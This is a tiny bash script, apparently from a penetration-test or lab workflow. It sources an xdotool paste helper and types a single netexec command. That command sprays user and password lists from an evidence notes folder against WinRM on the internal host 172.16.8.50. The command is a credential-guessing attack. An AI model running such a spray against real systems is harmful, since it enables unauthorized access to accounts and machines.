#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "netexec winrm 172.16.8.50 -u documentation/evidence/notes/ad_users.txt -p documentation/evidence/notes/ad_passwords.txt"